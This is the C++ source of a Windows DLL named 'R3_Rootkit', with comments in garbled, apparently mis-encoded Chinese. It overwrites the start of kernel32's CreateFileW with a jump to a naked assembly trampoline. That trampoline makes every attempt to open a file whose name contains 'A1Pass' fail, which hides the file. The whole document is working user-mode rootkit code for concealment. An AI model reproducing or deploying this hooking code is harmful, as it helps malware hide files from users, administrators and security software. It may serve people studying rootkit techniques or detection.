// R3_Rootkit.cpp : ���� DLL Ӧ�ó���ĵ���������
//

#include "stdafx.h"
#include <string.h>
#include <stdio.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")

LPCTSTR g_lpFileName     = nullptr;
DWORD   g_dwCreateFile_5 = 0;       // Hook���CreateFile��������ʼ��ַ

DWORD Detour(LPCTSTR lpFileName)
{
	if ( wcsstr(PathFindFileName(lpFileName), L"A1Pass") )
		return 1;
	return 0;
}


extern "C" _declspec(dllexport) _declspec(naked) void Trampline()
{
	_asm push eax;
	_asm mov  eax,DWORD PTR[esp+0x8]; // ��CreateFileW�ĵ�һ����������eax
	_asm mov  g_lpFileName,eax;       // ���˲�����ַ������g_lpFileName��
	_asm pop  eax;
	if ( Detour(g_lpFileName) )       // ִ�����ǵ����к������ж��ļ����Ƿ�Ϊ��Ҫ������
	{
		_asm mov eax,-1;              // �ǵĻ��򽫺�������ֵ��Ϊ-1����ʧ�ܣ�
		_asm retn 0x1C;               // ���ص�����
	}
	_asm push ebp;                    // ����ִ��ԭ����ͷ�����滻����ָ�����ת��ԭ����
	_asm mov ebp,esp;
	_asm push g_dwCreateFile_5;
	_asm ret;
}

void HookCreateFileW()
{
	FARPROC fnCreateFile = GetProcAddress( GetModuleHandle(L"kernel32.dll"), "CreateFileW");
	FARPROC fnHookFun    = GetProcAddress( GetModuleHandle(L"R3_Rootkit.dll"), "Trampline");

	DWORD oldProtect;
	VirtualProtect(fnCreateFile, 0x5, PAGE_EXECUTE_READWRITE, &oldProtect);
	*((PBYTE)fnCreateFile)           = 0xE9;
	*(PDWORD)((PBYTE)fnCreateFile+1) = (DWORD)fnHookFun - (DWORD)fnCreateFile - 5;
	VirtualProtect(fnCreateFile, 0x5, oldProtect, &oldProtect);

	g_dwCreateFile_5 = (DWORD)fnCreateFile + 5;
}